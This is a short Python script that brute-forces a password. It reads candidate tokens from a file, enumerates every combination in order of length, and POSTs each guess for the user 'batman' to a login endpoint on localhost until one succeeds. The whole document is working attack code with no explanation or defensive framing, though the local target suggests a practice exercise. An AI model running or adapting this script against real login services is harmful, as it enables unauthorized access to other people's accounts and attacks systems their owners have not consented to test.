import requests

with open('pass.txt') as f:
    alphabet = f.read().split('\n')



base = len(alphabet)

i = 0
length = 0

while True:
    # i: 10 -> base

    password = ''
    temp = i
    while temp != 0:
        rest = temp % base
        temp = temp // base
        password = alphabet[rest] + password

    # while len(password) < length:
    #     password = '0' + password
    password = alphabet[0] * (length - len(password)) + password

    print(length, i, password)
    response = requests.post('http://127.0.0.1:3000/auth',
                             json={'login': 'batman', 'password': password})
    if response.status_code == 200:
        print('Success!')
        break

    if password == alphabet[-1] * length:
        length += 1
        i = 0
    else:
        i += 1
